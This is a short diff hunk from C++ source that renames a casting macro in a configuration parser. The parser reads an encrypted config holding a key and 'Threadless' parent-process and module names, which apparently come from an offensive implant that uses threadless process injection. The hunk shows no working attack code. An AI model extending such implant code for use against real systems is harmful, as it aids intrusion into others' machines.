@@ -15,9 +15,9 @@ namespace Rsrc {
             x_memset(Config, 0, sizeof(Config));
             //XteaCrypt(B_PTR(Parser.Handle), Parser.Length, Ctx->ConfigBytes.Key, FALSE);
 
-            Parser::ParserStrcpy(&Parser, RCAST(LPSTR*, &Ctx->Config.Key), nullptr);
-            Parser::ParserMemcpy(&Parser, RCAST(PBYTE*, &Ctx->Root), nullptr);
-            Parser::ParserMemcpy(&Parser, RCAST(PBYTE*, &Ctx->LE), nullptr);
+            Parser::ParserStrcpy(&Parser, R_CAST(LPSTR*, &Ctx->Config.Key), nullptr);
+            Parser::ParserMemcpy(&Parser, R_CAST(PBYTE*, &Ctx->Root), nullptr);
+            Parser::ParserMemcpy(&Parser, R_CAST(PBYTE*, &Ctx->LE), nullptr);
 
             Parser::ParserStrcpy(&Parser, &Threadless.Parent.Buffer, &Threadless.Parent.Length);
             Parser::ParserStrcpy(&Parser, &Threadless.Module.Buffer, &Threadless.Module.Length);
